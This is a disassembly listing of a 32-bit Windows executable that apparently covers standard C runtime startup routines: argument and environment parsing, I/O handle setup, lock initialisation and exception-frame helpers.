  424dca:	xor    edx,edx
  424dcc:	jmp    0x424dd0
  424dce:	inc    eax
  424dcf:	inc    edx
  424dd0:	cmp    BYTE PTR [eax],0x5c
  424dd3:	je     0x424dce
  424dd5:	cmp    BYTE PTR [eax],0x22
  424dd8:	jne    0x424e00
  424dda:	test   dl,0x1
  424ddd:	jne    0x424dfe
  424ddf:	cmp    DWORD PTR [ebp-0x4],0x0
  424de3:	je     0x424df1
  424de5:	lea    ecx,[eax+0x1]
  424de8:	cmp    BYTE PTR [ecx],0x22
  424deb:	jne    0x424df1
  424ded:	mov    eax,ecx
  424def:	jmp    0x424df3
  424df1:	xor    ebx,ebx
  424df3:	xor    ecx,ecx
  424df5:	cmp    DWORD PTR [ebp-0x4],ecx
  424df8:	sete   cl
  424dfb:	mov    DWORD PTR [ebp-0x4],ecx
  424dfe:	shr    edx,1
  424e00:	test   edx,edx
  424e02:	je     0x424e11
  424e04:	test   edi,edi
  424e06:	je     0x424e0c
  424e08:	mov    BYTE PTR [edi],0x5c
  424e0b:	inc    edi
  424e0c:	inc    DWORD PTR [esi]
  424e0e:	dec    edx
  424e0f:	jne    0x424e04
  424e11:	mov    cl,BYTE PTR [eax]
  424e13:	test   cl,cl
  424e15:	je     0x424e5f
  424e17:	cmp    DWORD PTR [ebp-0x4],0x0
  424e1b:	jne    0x424e27
  424e1d:	cmp    cl,0x20
  424e20:	je     0x424e5f
  424e22:	cmp    cl,0x9
  424e25:	je     0x424e5f
  424e27:	test   ebx,ebx
  424e29:	je     0x424e59
  424e2b:	test   edi,edi
  424e2d:	je     0x424e48
  424e2f:	movzx  edx,cl
  424e32:	test   BYTE PTR [edx+0x463a21],0x4
  424e39:	je     0x424e41
  424e3b:	mov    BYTE PTR [edi],cl
  424e3d:	inc    edi
  424e3e:	inc    eax
  424e3f:	inc    DWORD PTR [esi]
  424e41:	mov    cl,BYTE PTR [eax]
  424e43:	mov    BYTE PTR [edi],cl
  424e45:	inc    edi
  424e46:	jmp    0x424e57
  424e48:	movzx  ecx,cl
  424e4b:	test   BYTE PTR [ecx+0x463a21],0x4
  424e52:	je     0x424e57
  424e54:	inc    eax
  424e55:	inc    DWORD PTR [esi]
  424e57:	inc    DWORD PTR [esi]
  424e59:	inc    eax
  424e5a:	jmp    0x424dc7
  424e5f:	test   edi,edi
  424e61:	je     0x424e67
  424e63:	and    BYTE PTR [edi],0x0
  424e66:	inc    edi
  424e67:	inc    DWORD PTR [esi]
  424e69:	mov    ebx,DWORD PTR [ebp+0xc]
  424e6c:	jmp    0x424d92
  424e71:	mov    eax,DWORD PTR [ebp+0x8]
  424e74:	test   eax,eax
  424e76:	je     0x424e7b
  424e78:	and    DWORD PTR [eax],0x0
  424e7b:	inc    DWORD PTR [ebx]
  424e7d:	pop    edi
  424e7e:	pop    ebx
  424e7f:	leave  
  424e80:	ret    
  424e81:	push   ebp
  424e82:	mov    ebp,esp
  424e84:	push   ecx
  424e85:	push   ecx
  424e86:	push   ebx
  424e87:	push   esi
  424e88:	push   edi
  424e89:	xor    edi,edi
  424e8b:	cmp    DWORD PTR ds:0x463d6c,edi
  424e91:	jne    0x424e98
  424e93:	call   0x42601c
  424e98:	and    BYTE PTR ds:0x463714,0x0
  424e9f:	push   0x104
  424ea4:	mov    esi,0x463610
  424ea9:	push   esi
  424eaa:	push   edi
  424eab:	call   DWORD PTR ds:0x4290a8
  424eb1:	mov    eax,ds:0x463d74
  424eb6:	cmp    eax,edi
  424eb8:	mov    DWORD PTR ds:0x4635f4,esi
  424ebe:	je     0x424ec7
  424ec0:	cmp    BYTE PTR [eax],0x0
  424ec3:	mov    ebx,eax
  424ec5:	jne    0x424ec9
  424ec7:	mov    ebx,esi
  424ec9:	lea    eax,[ebp-0x4]
  424ecc:	push   eax
  424ecd:	push   edi
  424ece:	lea    esi,[ebp-0x8]
  424ed1:	xor    ecx,ecx
  424ed3:	mov    eax,ebx
  424ed5:	call   0x424d15
  424eda:	mov    esi,DWORD PTR [ebp-0x4]
  424edd:	mov    eax,DWORD PTR [ebp-0x8]
  424ee0:	shl    esi,0x2
  424ee3:	add    eax,esi
  424ee5:	push   eax
  424ee6:	call   0x426152
  424eeb:	mov    edi,eax
  424eed:	add    esp,0xc
  424ef0:	test   edi,edi
  424ef2:	jne    0x424ef9
  424ef4:	or     eax,0xffffffff
  424ef7:	jmp    0x424f1e
  424ef9:	lea    eax,[ebp-0x4]
  424efc:	push   eax
  424efd:	lea    ecx,[esi+edi*1]
  424f00:	push   edi
  424f01:	lea    esi,[ebp-0x8]
  424f04:	mov    eax,ebx
  424f06:	call   0x424d15
  424f0b:	mov    eax,DWORD PTR [ebp-0x4]
  424f0e:	dec    eax
  424f0f:	pop    ecx
  424f10:	mov    ds:0x4635d8,eax
  424f15:	pop    ecx
  424f16:	mov    DWORD PTR ds:0x4635dc,edi
  424f1c:	xor    eax,eax
  424f1e:	pop    edi
  424f1f:	pop    esi
  424f20:	pop    ebx
  424f21:	leave  
  424f22:	ret    
  424f23:	push   ecx
  424f24:	push   ecx
  424f25:	mov    eax,ds:0x463718
  424f2a:	push   ebx
  424f2b:	push   ebp
  424f2c:	push   esi
  424f2d:	push   edi
  424f2e:	mov    edi,DWORD PTR ds:0x4290c0
  424f34:	xor    ebx,ebx
  424f36:	xor    esi,esi
  424f38:	cmp    eax,ebx
  424f3a:	push   0x2
  424f3c:	pop    ebp
  424f3d:	jne    0x424f6c
  424f3f:	call   edi
  424f41:	mov    esi,eax
  424f43:	cmp    esi,ebx
  424f45:	je     0x424f53
  424f47:	mov    DWORD PTR ds:0x463718,0x1
  424f51:	jmp    0x424f71
  424f53:	call   DWORD PTR ds:0x429030
  424f59:	cmp    eax,0x78
  424f5c:	jne    0x424f67
  424f5e:	mov    eax,ebp
  424f60:	mov    ds:0x463718,eax
  424f65:	jmp    0x424f6c
  424f67:	mov    eax,ds:0x463718
  424f6c:	cmp    eax,0x1
  424f6f:	jne    0x424fee
  424f71:	cmp    esi,ebx
  424f73:	jne    0x424f7d
  424f75:	call   edi
  424f77:	mov    esi,eax
  424f79:	cmp    esi,ebx
  424f7b:	je     0x424ff6
  424f7d:	cmp    WORD PTR [esi],bx
  424f80:	mov    eax,esi
  424f82:	je     0x424f92
  424f84:	add    eax,ebp
  424f86:	cmp    WORD PTR [eax],bx
  424f89:	jne    0x424f84
  424f8b:	add    eax,ebp
  424f8d:	cmp    WORD PTR [eax],bx
  424f90:	jne    0x424f84
  424f92:	mov    edi,DWORD PTR ds:0x4290bc
  424f98:	push   ebx
  424f99:	push   ebx
  424f9a:	push   ebx
  424f9b:	sub    eax,esi
  424f9d:	push   ebx
  424f9e:	sar    eax,1
  424fa0:	inc    eax
  424fa1:	push   eax
  424fa2:	push   esi
  424fa3:	push   ebx
  424fa4:	push   ebx
  424fa5:	mov    DWORD PTR [esp+0x34],eax
  424fa9:	call   edi
  424fab:	mov    ebp,eax
  424fad:	cmp    ebp,ebx
  424faf:	je     0x424fe3
  424fb1:	push   ebp
  424fb2:	call   0x426152
  424fb7:	cmp    eax,ebx
  424fb9:	pop    ecx
  424fba:	mov    DWORD PTR [esp+0x10],eax
  424fbe:	je     0x424fe3
  424fc0:	push   ebx
  424fc1:	push   ebx
  424fc2:	push   ebp
  424fc3:	push   eax
  424fc4:	push   DWORD PTR [esp+0x24]
  424fc8:	push   esi
  424fc9:	push   ebx
  424fca:	push   ebx
  424fcb:	call   edi
  424fcd:	test   eax,eax
  424fcf:	jne    0x424fdf
  424fd1:	push   DWORD PTR [esp+0x10]
  424fd5:	call   0x42603a
  424fda:	pop    ecx
  424fdb:	mov    DWORD PTR [esp+0x10],ebx
  424fdf:	mov    ebx,DWORD PTR [esp+0x10]
  424fe3:	push   esi
  424fe4:	call   DWORD PTR ds:0x4290b8
  424fea:	mov    eax,ebx
  424fec:	jmp    0x42503e
  424fee:	cmp    eax,ebp
  424ff0:	je     0x424ffa
  424ff2:	cmp    eax,ebx
  424ff4:	je     0x424ffa
  424ff6:	xor    eax,eax
  424ff8:	jmp    0x42503e
  424ffa:	call   DWORD PTR ds:0x4290b4
  425000:	mov    esi,eax
  425002:	cmp    esi,ebx
  425004:	je     0x424ff6
  425006:	cmp    BYTE PTR [esi],bl
  425008:	je     0x425014
  42500a:	inc    eax
  42500b:	cmp    BYTE PTR [eax],bl
  42500d:	jne    0x42500a
  42500f:	inc    eax
  425010:	cmp    BYTE PTR [eax],bl
  425012:	jne    0x42500a
  425014:	sub    eax,esi
  425016:	inc    eax
  425017:	mov    ebp,eax
  425019:	push   ebp
  42501a:	call   0x426152
  42501f:	mov    edi,eax
  425021:	cmp    edi,ebx
  425023:	pop    ecx
  425024:	jne    0x42502a
  425026:	xor    edi,edi
  425028:	jmp    0x425035
  42502a:	push   ebp
  42502b:	push   esi
  42502c:	push   edi
  42502d:	call   0x426170
  425032:	add    esp,0xc
  425035:	push   esi
  425036:	call   DWORD PTR ds:0x4290b0
  42503c:	mov    eax,edi
  42503e:	pop    edi
  42503f:	pop    esi
  425040:	pop    ebp
  425041:	pop    ebx
  425042:	pop    ecx
  425043:	pop    ecx
  425044:	ret    
  425045:	sub    esp,0x48
  425048:	push   ebx
  425049:	mov    ebx,0x480
  42504e:	push   ebx
  42504f:	call   0x426152
  425054:	test   eax,eax
  425056:	pop    ecx
  425057:	jne    0x425061
  425059:	or     eax,0xffffffff
  42505c:	jmp    0x42523e
  425061:	mov    ds:0x463c60,eax
  425066:	mov    DWORD PTR ds:0x463c48,0x20
  425070:	lea    ecx,[eax+0x480]
  425076:	jmp    0x425096
  425078:	and    BYTE PTR [eax+0x4],0x0
  42507c:	or     DWORD PTR [eax],0xffffffff
  42507f:	and    DWORD PTR [eax+0x8],0x0
  425083:	mov    BYTE PTR [eax+0x5],0xa
  425087:	mov    ecx,DWORD PTR ds:0x463c60
  42508d:	add    eax,0x24
  425090:	add    ecx,0x480
  425096:	cmp    eax,ecx
  425098:	jb     0x425078
  42509a:	push   ebp
  42509b:	push   esi
  42509c:	push   edi
  42509d:	lea    eax,[esp+0x14]
  4250a1:	push   eax
  4250a2:	call   DWORD PTR ds:0x429090
  4250a8:	cmp    WORD PTR [esp+0x46],0x0
  4250ae:	je     0x42519d
  4250b4:	mov    eax,DWORD PTR [esp+0x48]
  4250b8:	test   eax,eax
  4250ba:	je     0x42519d
  4250c0:	mov    edi,DWORD PTR [eax]
  4250c2:	lea    ebp,[eax+0x4]
  4250c5:	lea    eax,[edi+ebp*1]
  4250c8:	mov    DWORD PTR [esp+0x10],eax
  4250cc:	mov    eax,0x800
  4250d1:	cmp    edi,eax
  4250d3:	jl     0x4250d7
  4250d5:	mov    edi,eax
  4250d7:	cmp    DWORD PTR ds:0x463c48,edi
  4250dd:	jge    0x42512d
  4250df:	mov    esi,0x463c64
  4250e4:	push   ebx
  4250e5:	call   0x426152
  4250ea:	test   eax,eax
  4250ec:	pop    ecx
  4250ed:	je     0x425127
  4250ef:	add    DWORD PTR ds:0x463c48,0x20
  4250f6:	mov    DWORD PTR [esi],eax
  4250f8:	lea    ecx,[eax+0x480]
  4250fe:	jmp    0x425116
  425100:	and    BYTE PTR [eax+0x4],0x0
  425104:	or     DWORD PTR [eax],0xffffffff
  425107:	and    DWORD PTR [eax+0x8],0x0
  42510b:	mov    BYTE PTR [eax+0x5],0xa
  42510f:	mov    ecx,DWORD PTR [esi]
  425111:	add    eax,0x24
  425114:	add    ecx,ebx
  425116:	cmp    eax,ecx
  425118:	jb     0x425100
  42511a:	add    esi,0x4
  42511d:	cmp    DWORD PTR ds:0x463c48,edi
  425123:	jl     0x4250e4
  425125:	jmp    0x42512d
  425127:	mov    edi,DWORD PTR ds:0x463c48
  42512d:	xor    ebx,ebx
  42512f:	test   edi,edi
  425131:	jle    0x42519d
  425133:	mov    eax,DWORD PTR [esp+0x10]
  425137:	mov    eax,DWORD PTR [eax]
  425139:	cmp    eax,0xffffffff
  42513c:	je     0x425192
  42513e:	mov    cl,BYTE PTR [ebp+0x0]
  425141:	test   cl,0x1
  425144:	je     0x425192
  425146:	test   cl,0x8
  425149:	jne    0x425156
  42514b:	push   eax
  42514c:	call   DWORD PTR ds:0x4290c8
  425152:	test   eax,eax
  425154:	je     0x425192
  425156:	mov    ecx,ebx
  425158:	mov    eax,ebx
  42515a:	and    eax,0x1f
  42515d:	lea    eax,[eax+eax*8]
  425160:	sar    ecx,0x5
  425163:	mov    ecx,DWORD PTR [ecx*4+0x463c60]
  42516a:	lea    esi,[ecx+eax*4]
  42516d:	mov    eax,DWORD PTR [esp+0x10]
  425171:	mov    eax,DWORD PTR [eax]
  425173:	mov    DWORD PTR [esi],eax
  425175:	mov    al,BYTE PTR [ebp+0x0]
  425178:	mov    BYTE PTR [esi+0x4],al
  42517b:	lea    eax,[esi+0xc]
  42517e:	push   0xfa0
  425183:	push   eax
  425184:	call   0x4264bd
  425189:	test   eax,eax
  42518b:	pop    ecx
  42518c:	pop    ecx
  42518d:	je     0x4251bd
  42518f:	inc    DWORD PTR [esi+0x8]
  425192:	add    DWORD PTR [esp+0x10],0x4
  425197:	inc    ebx
  425198:	inc    ebp
  425199:	cmp    ebx,edi
  42519b:	jl     0x425133
  42519d:	xor    ebx,ebx
  42519f:	mov    ecx,DWORD PTR ds:0x463c60
  4251a5:	lea    eax,[ebx+ebx*8]
  4251a8:	lea    esi,[ecx+eax*4]
  4251ab:	cmp    DWORD PTR [esi],0xffffffff
  4251ae:	jne    0x42521f
  4251b0:	test   ebx,ebx
  4251b2:	mov    BYTE PTR [esi+0x4],0x81
  4251b6:	jne    0x4251c2
  4251b8:	push   0xfffffff6
  4251ba:	pop    eax
  4251bb:	jmp    0x4251cc
  4251bd:	or     eax,0xffffffff
  4251c0:	jmp    0x42523b
  4251c2:	mov    eax,ebx
  4251c4:	dec    eax
  4251c5:	neg    eax
  4251c7:	sbb    eax,eax
  4251c9:	add    eax,0xfffffff5
  4251cc:	push   eax
  4251cd:	call   DWORD PTR ds:0x4290a4
  4251d3:	mov    edi,eax
  4251d5:	cmp    edi,0xffffffff
  4251d8:	je     0x425219
  4251da:	push   edi
  4251db:	call   DWORD PTR ds:0x4290c8
  4251e1:	test   eax,eax
  4251e3:	je     0x425219
  4251e5:	and    eax,0xff
  4251ea:	cmp    eax,0x2
  4251ed:	mov    DWORD PTR [esi],edi
  4251ef:	jne    0x4251f7
  4251f1:	or     BYTE PTR [esi+0x4],0x40
  4251f5:	jmp    0x425200
  4251f7:	cmp    eax,0x3
  4251fa:	jne    0x425200
  4251fc:	or     BYTE PTR [esi+0x4],0x8
  425200:	lea    eax,[esi+0xc]
  425203:	push   0xfa0
  425208:	push   eax
  425209:	call   0x4264bd
  42520e:	test   eax,eax
  425210:	pop    ecx
  425211:	pop    ecx
  425212:	je     0x4251bd
  425214:	inc    DWORD PTR [esi+0x8]
  425217:	jmp    0x425223
  425219:	or     BYTE PTR [esi+0x4],0x40
  42521d:	jmp    0x425223
  42521f:	or     BYTE PTR [esi+0x4],0x80
  425223:	inc    ebx
  425224:	cmp    ebx,0x3
  425227:	jl     0x42519f
  42522d:	push   DWORD PTR ds:0x463c48
  425233:	call   DWORD PTR ds:0x4290c4
  425239:	xor    eax,eax
  42523b:	pop    edi
  42523c:	pop    esi
  42523d:	pop    ebp
  42523e:	pop    ebx
  42523f:	add    esp,0x48
  425242:	ret    
  425243:	push   0xc
  425245:	push   0x4295f8
  42524a:	call   0x425434
  42524f:	mov    DWORD PTR [ebp-0x1c],0x42a050
  425256:	cmp    DWORD PTR [ebp-0x1c],0x42a050
  42525d:	jae    0x425281
  42525f:	and    DWORD PTR [ebp-0x4],0x0
  425263:	mov    eax,DWORD PTR [ebp-0x1c]
  425266:	mov    eax,DWORD PTR [eax]
  425268:	test   eax,eax
  42526a:	je     0x425277
  42526c:	call   eax
  42526e:	jmp    0x425277
  425270:	xor    eax,eax
  425272:	inc    eax
  425273:	ret    
  425274:	mov    esp,DWORD PTR [ebp-0x18]
  425277:	or     DWORD PTR [ebp-0x4],0xffffffff
  42527b:	add    DWORD PTR [ebp-0x1c],0x4
  42527f:	jmp    0x425256
  425281:	call   0x42546f
  425286:	ret    
  425287:	push   0xc
  425289:	push   0x429608
  42528e:	call   0x425434
  425293:	mov    DWORD PTR [ebp-0x1c],0x42a058
  42529a:	cmp    DWORD PTR [ebp-0x1c],0x42a058
  4252a1:	jae    0x4252c5
  4252a3:	and    DWORD PTR [ebp-0x4],0x0
  4252a7:	mov    eax,DWORD PTR [ebp-0x1c]
  4252aa:	mov    eax,DWORD PTR [eax]
  4252ac:	test   eax,eax
  4252ae:	je     0x4252bb
  4252b0:	call   eax
  4252b2:	jmp    0x4252bb
  4252b4:	xor    eax,eax
  4252b6:	inc    eax
  4252b7:	ret    
  4252b8:	mov    esp,DWORD PTR [ebp-0x18]
  4252bb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4252bf:	add    DWORD PTR [ebp-0x1c],0x4
  4252c3:	jmp    0x42529a
  4252c5:	call   0x42546f
  4252ca:	ret    
  4252cb:	call   0x425506
  4252d0:	mov    eax,ds:0x462dfc
  4252d5:	cmp    eax,0xffffffff
  4252d8:	je     0x4252e8
  4252da:	push   eax
  4252db:	call   DWORD PTR ds:0x4290d0
  4252e1:	or     DWORD PTR ds:0x462dfc,0xffffffff
  4252e8:	ret    
  4252e9:	push   ebx
  4252ea:	push   esi
  4252eb:	call   DWORD PTR ds:0x429030
  4252f1:	push   DWORD PTR ds:0x462dfc
  4252f7:	mov    ebx,eax
  4252f9:	call   DWORD PTR ds:0x4290e0
  4252ff:	mov    esi,eax
  425301:	test   esi,esi
  425303:	jne    0x42534e
  425305:	push   0x88
  42530a:	push   0x1
  42530c:	call   0x426548
  425311:	mov    esi,eax
  425313:	test   esi,esi
  425315:	pop    ecx
  425316:	pop    ecx
  425317:	je     0x425346
  425319:	push   esi
  42531a:	push   DWORD PTR ds:0x462dfc
  425320:	call   DWORD PTR ds:0x4290dc
  425326:	test   eax,eax
  425328:	je     0x425346
  42532a:	mov    DWORD PTR [esi+0x54],0x462d50
  425331:	mov    DWORD PTR [esi+0x14],0x1
  425338:	call   DWORD PTR ds:0x4290d8
  42533e:	or     DWORD PTR [esi+0x4],0xffffffff
  425342:	mov    DWORD PTR [esi],eax
  425344:	jmp    0x42534e
  425346:	push   0x10
  425348:	call   0x4244fc
  42534d:	pop    ecx
  42534e:	push   ebx
  42534f:	call   DWORD PTR ds:0x4290d4
  425355:	mov    eax,esi
  425357:	pop    esi
  425358:	pop    ebx
  425359:	ret    
  42535a:	call   0x4254bd
  42535f:	test   eax,eax
  425361:	je     0x425373
  425363:	call   DWORD PTR ds:0x4290e4
  425369:	cmp    eax,0xffffffff
  42536c:	mov    ds:0x462dfc,eax
  425371:	jne    0x42537b
  425373:	call   0x4252cb
  425378:	xor    eax,eax
  42537a:	ret    
  42537b:	push   esi
  42537c:	push   0x88
  425381:	push   0x1
  425383:	call   0x426548
  425388:	mov    esi,eax
  42538a:	test   esi,esi
  42538c:	pop    ecx
  42538d:	pop    ecx
  42538e:	je     0x4253c0
  425390:	push   esi
  425391:	push   DWORD PTR ds:0x462dfc
  425397:	call   DWORD PTR ds:0x4290dc
  42539d:	test   eax,eax
  42539f:	je     0x4253c0
  4253a1:	mov    DWORD PTR [esi+0x54],0x462d50
  4253a8:	mov    DWORD PTR [esi+0x14],0x1
  4253af:	call   DWORD PTR ds:0x4290d8
  4253b5:	or     DWORD PTR [esi+0x4],0xffffffff
  4253b9:	mov    DWORD PTR [esi],eax
  4253bb:	xor    eax,eax
  4253bd:	inc    eax
  4253be:	pop    esi
  4253bf:	ret    
  4253c0:	call   0x4252cb
  4253c5:	xor    eax,eax
  4253c7:	pop    esi
  4253c8:	ret    
  4253c9:	cmp    DWORD PTR ds:0x4635c4,0x2
  4253d0:	jne    0x4253df
  4253d2:	cmp    DWORD PTR ds:0x4635d0,0x5
  4253d9:	jb     0x4253df
  4253db:	xor    eax,eax
  4253dd:	inc    eax
  4253de:	ret    
  4253df:	push   0x3
  4253e1:	pop    eax
  4253e2:	ret    
  4253e3:	xor    eax,eax
  4253e5:	cmp    DWORD PTR [esp+0x4],eax
  4253e9:	push   0x0
  4253eb:	sete   al
  4253ee:	push   0x1000
  4253f3:	push   eax
  4253f4:	call   DWORD PTR ds:0x429040
  4253fa:	test   eax,eax
  4253fc:	mov    ds:0x463c40,eax
  425401:	je     0x42542d
  425403:	call   0x4253c9
  425408:	cmp    eax,0x3
  42540b:	mov    ds:0x463c44,eax
  425410:	jne    0x425430
  425412:	push   0x3f8
  425417:	call   0x4267ca
  42541c:	test   eax,eax
  42541e:	pop    ecx
  42541f:	jne    0x425430
  425421:	push   DWORD PTR ds:0x463c40
  425427:	call   DWORD PTR ds:0x4290e8
  42542d:	xor    eax,eax
  42542f:	ret    
  425430:	xor    eax,eax
  425432:	inc    eax
  425433:	ret    
  425434:	push   0x4272f8
  425439:	mov    eax,fs:0x0
  42543f:	push   eax
  425440:	mov    eax,DWORD PTR [esp+0x10]
  425444:	mov    DWORD PTR [esp+0x10],ebp
  425448:	lea    ebp,[esp+0x10]
  42544c:	sub    esp,eax
  42544e:	push   ebx
  42544f:	push   esi
  425450:	push   edi
  425451:	mov    eax,DWORD PTR [ebp-0x8]
  425454:	mov    DWORD PTR [ebp-0x18],esp
  425457:	push   eax
  425458:	mov    eax,DWORD PTR [ebp-0x4]
  42545b:	mov    DWORD PTR [ebp-0x4],0xffffffff
  425462:	mov    DWORD PTR [ebp-0x8],eax
  425465:	lea    eax,[ebp-0x10]
  425468:	mov    fs:0x0,eax
  42546e:	ret    
  42546f:	mov    ecx,DWORD PTR [ebp-0x10]
  425472:	mov    DWORD PTR fs:0x0,ecx
  425479:	pop    ecx
  42547a:	pop    edi
  42547b:	pop    esi
  42547c:	pop    ebx
  42547d:	leave  
  42547e:	push   ecx
  42547f:	ret    
  425480:	cmp    eax,0x1000
  425485:	jae    0x425495
  425487:	neg    eax
  425489:	add    eax,esp
  42548b:	add    eax,0x4
  42548e:	test   DWORD PTR [eax],eax
  425490:	xchg   esp,eax
  425491:	mov    eax,DWORD PTR [eax]
  425493:	push   eax
  425494:	ret    
  425495:	push   ecx
  425496:	lea    ecx,[esp+0x8]
  42549a:	sub    ecx,0x1000
  4254a0:	sub    eax,0x1000
  4254a5:	test   DWORD PTR [ecx],eax
  4254a7:	cmp    eax,0x1000
  4254ac:	jae    0x42549a
  4254ae:	sub    ecx,eax
  4254b0:	mov    eax,esp
  4254b2:	test   DWORD PTR [ecx],eax
  4254b4:	mov    esp,ecx
  4254b6:	mov    ecx,DWORD PTR [eax]
  4254b8:	mov    eax,DWORD PTR [eax+0x4]
  4254bb:	push   eax
  4254bc:	ret    
  4254bd:	push   esi
  4254be:	push   edi
  4254bf:	xor    esi,esi
  4254c1:	mov    edi,0x463720
  4254c6:	cmp    DWORD PTR [esi*8+0x462e14],0x1
  4254ce:	jne    0x4254ee
  4254d0:	lea    eax,[esi*8+0x462e10]
  4254d7:	mov    DWORD PTR [eax],edi
  4254d9:	push   0xfa0
  4254de:	push   DWORD PTR [eax]
  4254e0:	add    edi,0x18
  4254e3:	call   0x4264bd
  4254e8:	test   eax,eax
  4254ea:	pop    ecx
  4254eb:	pop    ecx
  4254ec:	je     0x4254fa
  4254ee:	inc    esi
  4254ef:	cmp    esi,0x24
  4254f2:	jl     0x4254c6
  4254f4:	xor    eax,eax
  4254f6:	inc    eax
  4254f7:	pop    edi
  4254f8:	pop    esi
  4254f9:	ret    
  4254fa:	and    DWORD PTR [esi*8+0x462e10],0x0
  425502:	xor    eax,eax
  425504:	jmp    0x4254f7
  425506:	push   ebx
  425507:	mov    ebx,DWORD PTR ds:0x4290cc
  42550d:	push   esi
  42550e:	mov    esi,0x462e10
  425513:	push   edi
  425514:	mov    edi,DWORD PTR [esi]
  425516:	test   edi,edi
  425518:	je     0x42552d
  42551a:	cmp    DWORD PTR [esi+0x4],0x1
  42551e:	je     0x42552d
  425520:	push   edi
  425521:	call   ebx
  425523:	push   edi
  425524:	call   0x42603a
  425529:	and    DWORD PTR [esi],0x0
  42552c:	pop    ecx
  42552d:	add    esi,0x8
  425530:	cmp    esi,0x462f30
  425536:	jl     0x425514
  425538:	mov    esi,0x462e10
  42553d:	pop    edi
  42553e:	mov    eax,DWORD PTR [esi]
  425540:	test   eax,eax
  425542:	je     0x42554d
  425544:	cmp    DWORD PTR [esi+0x4],0x1
  425548:	jne    0x42554d
  42554a:	push   eax
  42554b:	call   ebx
  42554d:	add    esi,0x8
  425550:	cmp    esi,0x462f30
  425556:	jl     0x42553e
  425558:	pop    esi
  425559:	pop    ebx
  42555a:	ret    
  42555b:	push   ebp
  42555c:	mov    ebp,esp
  42555e:	mov    eax,DWORD PTR [ebp+0x8]
  425561:	push   DWORD PTR [eax*8+0x462e10]
  425568:	call   DWORD PTR ds:0x4290f0
  42556e:	pop    ebp
  42556f:	ret    
  425570:	push   ebp
  425571:	mov    ebp,esp
  425573:	push   esi
  425574:	mov    esi,DWORD PTR [ebp+0x8]
  425577:	lea    esi,[esi*8+0x462e10]
  42557e:	cmp    DWORD PTR [esi],0x0
  425581:	je     0x425588
  425583:	xor    eax,eax
  425585:	inc    eax
  425586:	jmp    0x4255ec
  425588:	push   edi
  425589:	push   0x18
  42558b:	call   0x426152
  425590:	mov    edi,eax
  425592:	test   edi,edi
  425594:	pop    ecx
  425595:	jne    0x4255a6
  425597:	call   0x4273d0
  42559c:	mov    DWORD PTR [eax],0xc
  4255a2:	xor    eax,eax
  4255a4:	jmp    0x4255eb
  4255a6:	push   0xa
  4255a8:	call   0x4255ef
  4255ad:	cmp    DWORD PTR [esi],0x0
  4255b0:	pop    ecx
  4255b1:	jne    0x4255d9
  4255b3:	push   0xfa0
  4255b8:	push   edi
  4255b9:	call   0x4264bd
  4255be:	test   eax,eax
  4255c0:	pop    ecx
  4255c1:	pop    ecx
  4255c2:	jne    0x4255d5
  4255c4:	push   edi
  4255c5:	call   0x42603a
  4255ca:	push   0xa
  4255cc:	call   0x42555b
  4255d1:	pop    ecx
  4255d2:	pop    ecx
  4255d3:	jmp    0x425597
  4255d5:	mov    DWORD PTR [esi],edi
  4255d7:	jmp    0x4255e0
  4255d9:	push   edi
  4255da:	call   0x42603a
  4255df:	pop    ecx
  4255e0:	push   0xa
  4255e2:	call   0x42555b
  4255e7:	xor    eax,eax
  4255e9:	pop    ecx
  4255ea:	inc    eax
  4255eb:	pop    edi
  4255ec:	pop    esi
  4255ed:	pop    ebp
  4255ee:	ret    
  4255ef:	push   ebp
  4255f0:	mov    ebp,esp
  4255f2:	mov    eax,DWORD PTR [ebp+0x8]
  4255f5:	push   esi
  4255f6:	lea    esi,[eax*8+0x462e10]
  4255fd:	cmp    DWORD PTR [esi],0x0
  425600:	jne    0x425615
  425602:	push   eax
  425603:	call   0x425570
  425608:	test   eax,eax
  42560a:	pop    ecx
  42560b:	jne    0x425615
  42560d:	push   0x11
  42560f:	call   0x4244fc
  425614:	pop    ecx
  425615:	push   DWORD PTR [esi]
  425617:	call   DWORD PTR ds:0x4290f4
  42561d:	pop    esi
  42561e:	pop    ebp
  42561f:	ret    
  425620:	push   esi
  425621:	push   DWORD PTR ds:0x463d68
  425627:	call   0x427586
  42562c:	pop    ecx
  42562d:	mov    ecx,DWORD PTR ds:0x463d64
  425633:	mov    esi,eax
  425635:	mov    eax,ds:0x463d68
  42563a:	mov    edx,ecx
  42563c:	sub    edx,eax
  42563e:	add    edx,0x4
  425641:	cmp    esi,edx
  425643:	jae    0x425693
  425645:	mov    ecx,0x800
  42564a:	cmp    esi,ecx
  42564c:	jae    0x425650
  42564e:	mov    ecx,esi
  425650:	add    ecx,esi
  425652:	push   ecx
  425653:	push   eax
  425654:	call   0x4273d9
  425659:	test   eax,eax
  42565b:	pop    ecx
  42565c:	pop    ecx
  42565d:	jne    0x425676
  42565f:	add    esi,0x10
  425662:	push   esi
  425663:	push   DWORD PTR ds:0x463d68
  425669:	call   0x4273d9
  42566e:	test   eax,eax
  425670:	pop    ecx
  425671:	pop    ecx
  425672:	jne    0x425676
  425674:	pop    esi
  425675:	ret    
  425676:	mov    ecx,DWORD PTR ds:0x463d64
  42567c:	sub    ecx,DWORD PTR ds:0x463d68
  425682:	mov    ds:0x463d68,eax
  425687:	sar    ecx,0x2
  42568a:	lea    ecx,[eax+ecx*4]
  42568d:	mov    DWORD PTR ds:0x463d64,ecx
  425693:	mov    DWORD PTR [ecx],edi
  425695:	add    DWORD PTR ds:0x463d64,0x4
  42569c:	mov    eax,edi
  42569e:	pop    esi
  42569f:	ret    
  4256a0:	push   0x80
  4256a5:	call   0x426152
  4256aa:	test   eax,eax
  4256ac:	pop    ecx
  4256ad:	mov    ds:0x463d68,eax
  4256b2:	jne    0x4256b8
  4256b4:	push   0x18
  4256b6:	pop    eax
  4256b7:	ret    
  4256b8:	and    DWORD PTR [eax],0x0
  4256bb:	mov    eax,ds:0x463d68
  4256c0:	mov    ds:0x463d64,eax
  4256c5:	xor    eax,eax
  4256c7:	ret    
  4256c8:	push   0xc
  4256ca:	push   0x429618
  4256cf:	call   0x425434
  4256d4:	call   0x424747
  4256d9:	and    DWORD PTR [ebp-0x4],0x0
  4256dd:	mov    edi,DWORD PTR [ebp+0x8]
  4256e0:	call   0x425620
  4256e5:	mov    DWORD PTR [ebp-0x1c],eax
  4256e8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4256ec:	call   0x4256fa
  4256f1:	mov    eax,DWORD PTR [ebp-0x1c]
  4256f4:	call   0x42546f
  4256f9:	ret    
  4256fa:	call   0x424750
  4256ff:	ret    
  425700:	push   DWORD PTR [esp+0x4]
  425704:	call   0x4256c8
